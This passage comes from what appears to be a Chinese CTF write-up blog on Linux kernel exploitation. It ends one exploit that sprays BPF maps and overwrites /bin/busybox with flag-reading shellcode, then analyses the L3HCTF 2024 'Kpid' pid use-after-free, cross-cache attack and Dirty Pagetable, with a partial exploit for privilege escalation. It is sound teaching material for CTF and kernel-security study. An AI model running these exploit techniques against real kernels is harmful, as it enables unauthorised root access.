class="hljs-string">&quot;Eurus&quot;</span>);<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buffer));<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                kmalloc-512</span><br><span class="hljs-comment">                cpu_partial = 52</span><br><span class="hljs-comment">                min_partial = 5</span><br><span class="hljs-comment">                oo = 8</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;MAP_SPRAY_N; i++) &#123;<br>            map_fds[i] = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">0x200</span><span class="hljs-number">-0x140</span>, <span class="hljs-number">1</span>, BPF_F_WRONLY_PROG);<br>            <span class="hljs-keyword">if</span>(map_fds[i] &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;bpf_map_create&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray map over.&quot;</span>);<br><br>        <span class="hljs-type">int</span> bpf_fd = bpf(BPF_PROG_LOAD, &amp;hack_attr);<br>        <span class="hljs-keyword">if</span> (bpf_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;bpf_prog_load&quot;</span>), <span class="hljs-built_in">puts</span>(bpf_log_buf);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;MAP_SPRAY_N; i++) &#123;<br>                close(map_fds[i]);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Release maps over.&quot;</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;FILE_SPRAY_N; i++) &#123;<br>                file_fds[i] = open(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, O_RDONLY);<br>                <span class="hljs-keyword">if</span>(file_fds[i] &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray file over.&quot;</span>);<br><br>        trigger(bpf_fd);<br><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elfcode[] = &#123;<br>                <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x48</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x48</span>,<br>                <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x02</span>,<br>                <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>,<br>        &#125;;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;FILE_SPRAY_N; i++) &#123;<br>                <span class="hljs-type">int</span> n = write(file_fds[i], elfcode, <span class="hljs-keyword">sizeof</span>(elfcode));<br>                <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Write Success!&quot;</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 L3HCTF Kpid</title>
    <link href="/2025/08/14/kpid/"/>
    <url>/2025/08/14/kpid/</url>
    
    <content type="html"><![CDATA[<p>翻出一道历史悠久的题</p><span id="more"></span><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="ioctl功能"><a href="#ioctl功能" class="headerlink" title="ioctl功能"></a>ioctl功能</h2><p>三个功能：</p><ul><li><p>0x47001：调用kernel_clone，并记录pid结构体指针pid和pid号nr</p><ul><li><p>实际上和用户态调用fork效果一样（驱动代码如下）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">args.exit_signal = <span class="hljs-number">17LL</span>;<br><span class="hljs-built_in">memset</span>(&amp;args.<span class="hljs-built_in">stack</span>, <span class="hljs-number">0</span>, <span class="hljs-number">88</span>);<br><span class="hljs-built_in">memset</span>(&amp;args, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>nr = kernel_clone(&amp;args);<br></code></pre></td></tr></table></figure></li><li><p>fork系统调用定义，SIGCHLD就是17</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE0(fork)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_clone_args</span> <span class="hljs-title">args</span> =</span> &#123;<br>.exit_signal = SIGCHLD,<span class="hljs-comment">// 17</span><br>&#125;;<br><br><span class="hljs-keyword">return</span> kernel_clone(&amp;args);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>0x58002：获取nr，也就是子进程号，没什么好说的</p></li><li><p>0x69003：调用了put_pid，会将pid-&gt;count也就是引用计数减一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">put_pid</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pid *pid)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid_namespace</span> *<span class="hljs-title">ns</span>;</span><br><br><span class="hljs-keyword">if</span> (!pid)<br><span class="hljs-keyword">return</span>;<br><br>ns = pid-&gt;numbers[pid-&gt;level].ns;<br><span class="hljs-keyword">if</span> (refcount_dec_and_test(&amp;pid-&gt;count)) &#123;<br>kmem_cache_free(ns-&gt;pid_cachep, pid);<br>put_pid_ns(ns);<br>&#125;<br>&#125;<br>EXPORT_SYMBOL_GPL(put_pid);<br></code></pre></td></tr></table></figure><p>减到0就会将这个pid从对应ns里删除并释放</p></li></ul><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>可以通过0x69003功能释放pid结构体</p><h1 id="利用方法1"><a href="#利用方法1" class="headerlink" title="利用方法1"></a>利用方法1</h1><h2 id="Cross-Cache-Attack"><a href="#Cross-Cache-Attack" class="headerlink" title="Cross Cache Attack"></a>Cross Cache Attack</h2><p>pid结构体的分配释放使用专有cache，所以需要将攻击目标结构体转换到其他cache</p><p>slab内存管理数据结构图：</p><img src="/2025/08/14/kpid/slab.jpg" class title="slab"><p>分配逻辑：</p><ul><li>走kmem_cache_cpu<ul><li>走freelist</li><li>当kmem_cache_cpu-&gt;page为空时，遍历kmem_cache_cpu-&gt;partial，摘下一个slab放入kmem_cache_cpu-&gt;page</li></ul></li><li>走kmem_cache_node<ul><li>遍历kmem_cache_node-&gt;partial，摘下最多kmem_cache-&gt;cpu_partial &#x2F; 2个slab放入kmem_cache_cpu-&gt;partial</li></ul></li><li>申请新的slab，放入kmem_cache_cpu-&gt;page</li></ul><img src="/2025/08/14/kpid/alloc.webp" class title="alloc"><p>释放逻辑：</p><ul><li>对象属于kmem_cache_cpu-&gt;page，直接放回</li><li>对象属于kmem_cache_cpu-&gt;partial，直接放回</li><li>对象不属于kmem_cache_cpu-&gt;partial，且所属slab从full变为partial<ul><li>kmem_cache_cpu-&gt;partial容量不超过kmem_cache-&gt;cpu_partial，将slab放入kmem_cache_cpu-&gt;partial</li><li>kmem_cache_cpu-&gt;partial容量超过kmem_cache-&gt;cpu_partial，将kmem_cache_cpu-&gt;partial中slab放入kmem_cache_node-&gt;partial，将slab放入kmem_cache_cpu-&gt;partial</li></ul></li><li>对象不属于kmem_cache_cpu-&gt;partial，且所属slab从partial变为empty<ul><li>kmem_cache_node-&gt;partial容量不超过kmem_cache-&gt;min_partial，将slab放入kmem_cache_node-&gt;partial</li><li>kmem_cache_node-&gt;partial容量超过kmem_cache-&gt;min_partial，将slab放回buddy system</li></ul></li><li>对象属于kmem_cache_node-&gt;partial，直接放回</li></ul><img src="/2025/08/14/kpid/free.webp" class title="free"><p>Cross Cache Attack需要将攻击目标结构体所属slab放回buddy system，等待分配给另一个cache，相当于一个漏洞的转移</p><h2 id="Dirty-Pagetable"><a href="#Dirty-Pagetable" class="headerlink" title="Dirty Pagetable"></a>Dirty Pagetable</h2><p>可以通过增加或减少进程的refcount来控制pid-&gt;count，选择PTE作为攻击目标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> &#123;</span><br>    <span class="hljs-type">refcount_t</span>count;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>level;<br>    <span class="hljs-type">spinlock_t</span>lock;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span><span class="hljs-title">tasks</span>[4];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span><span class="hljs-title">inodes</span>;</span><br>    <span class="hljs-type">wait_queue_head_t</span>wait_pidfd;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">callback_head</span><span class="hljs-title">rcu</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">upid</span><span class="hljs-title">numbers</span>[1];</span><br>&#125;<br></code></pre></td></tr></table></figure><p>增加PTE 0x1000可以让两个PTE指向同一个page，造成UAF。可以通过判断页内容来找dirty page</p><img src="/2025/08/14/kpid/pte.png" class title="pte"><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><p>喷PTE消耗一波page，然后申请DMA-BUF，然后再喷一波PTE，这样能使DMA-BUF page之后相邻PTE page</p><img src="/2025/08/14/kpid/pte1.png" class title="pte1"><p>增加PTE 0x1000，造UAF page</p><img src="/2025/08/14/kpid/pte2.png" class title="pte2"><p>munmap UAF page，再mmap到DMA-BUF</p><img src="/2025/08/14/kpid/pte3.png" class title="pte3"><p>再增加PTE 0x1000，使dirty PTE指向另一个PTE页</p><img src="/2025/08/14/kpid/pte4.png" class title="pte4"><p>然后就可以通过UAF page改PTE表了，0x9c000泄露内核加载物理基址，然后改__sys_setresuid函数内容</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     PUT_MAGIC               0x69003</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     SHOW_MAGIC              0x58002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     FORK_MAGIC              0x47001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_PID_SPRAY             40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     OBJS_PER_SLAB           32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_PID_DISCARD           15</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_MMAP_SPRAY            0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     PATCH_TARGET_OFFSET     0x96bfe</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pidfd_open</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>&#123;<br>    <span class="hljs-keyword">return</span> syscall(SYS_pidfd_open, pid, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, FORK_MAGIC, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_show</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> *pid)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, SHOW_MAGIC, pid);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_put</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, PUT_MAGIC, <span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> fd_spray_cpu[N_PID_SPRAY];<br><span class="hljs-type">int</span> processes[N_PID_SPRAY];<br><span class="hljs-type">char</span> *spray_pages[N_MMAP_SPRAY];<br><span class="hljs-type">int</span> fd_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> fd_pipe_addref[<span class="hljs-number">0x10</span>][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> fd_pipe_sync[<span class="hljs-number">0x10</span>][<span class="hljs-number">2</span>];<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_un</span> <span class="hljs-title">unix_addr</span> =</span> &#123;<br>    .sun_family = AF_UNIX,<br>    .sun_path = <span class="hljs-string">&quot;/tmp/exploitsocket&quot;</span><br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_refcount</span><span class="hljs-params">(<span class="hljs-type">int</span> count, <span class="hljs-type">int</span> listensock)</span> &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;count; i++)&#123;<br>        <span class="hljs-type">int</span> refsock = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>);<br>        connect(refsock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;unix_addr, <span class="hljs-keyword">sizeof</span>(unix_addr));<br>        accept(listensock, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    signal(SIGCHLD, SIG_IGN);<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">int</span> listensock = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    unlink(unix_addr.sun_path);<br>    bind(listensock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;unix_addr, <span class="hljs-keyword">sizeof</span>(unix_addr));<br><br>    pipe(fd_pipe);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        pipe(fd_pipe_addref[i]);<br>        pipe(fd_pipe_sync[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        spray_pages[i] = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0xdead0000</span>UL + i*<span class="hljs-number">0x10000</span>UL,<br>                            <span class="hljs-number">0x10000</span>, PROT_READ | PROT_EXEC | PROT_WRITE,<br>                            MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(spray_pages[i] == MAP_FAILED)    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail mmap %d.\n&quot;</span>, i);<br>    &#125;<br><br>    <span class="hljs-type">char</span> tmp = *(<span class="hljs-type">char</span> *)spray_pages[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">int</span> dmafd = creat(<span class="hljs-string">&quot;/dev/dma_heap/system&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(dmafd == <span class="hljs-number">-1</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DMA open fail.&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd_dev = open(<span class="hljs-string">&quot;/dev/kpid&quot;</span>, O_RDWR);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PID_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == N_PID_DISCARD)&#123;<br>            kpid_clone(fd_dev);<br>            kpid_show(fd_dev, &amp;processes[N_PID_DISCARD]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span> == processes[N_PID_DISCARD])&#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child starts.&quot;</span>);<br>                <br>                <span class="hljs-type">char</span> tmp;<br>                read(fd_pipe[<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);<br>                <br>                listen(listensock, <span class="hljs-number">0x1001</span>);<br>                sleep(<span class="hljs-number">100000</span>);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Kpid: %d.\n&quot;</span>, processes[N_PID_DISCARD]);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;OBJS_PER_SLAB; 